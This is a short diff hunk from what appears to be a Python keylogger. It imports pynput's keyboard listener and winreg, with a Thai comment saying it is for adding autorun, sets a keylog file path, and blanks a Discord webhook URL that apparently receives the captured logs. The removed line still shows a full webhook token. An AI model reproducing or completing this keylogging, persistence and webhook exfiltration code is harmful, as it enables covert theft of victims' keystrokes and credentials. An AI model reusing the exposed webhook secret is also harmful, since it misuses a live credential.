@@ -9,7 +9,7 @@ from pynput import keyboard
 import winreg  # สำหรับเพิ่ม autorun
 
 # ⚠️ ใส่ Webhook URL ของคุณตรงนี้
-WEBHOOK_URL = "https://discord.com/api/webhooks/1368140434504941608/8B9F6WLh4Vc3hZ0IhkpiPOvPgut9WQAe7w9_GvFEy3CriXr0B_NBxR1IbWD8p0BI98ws"
+WEBHOOK_URL = ""
 
 # Log paths
 KEYLOG_PATH = "keylog.txt"
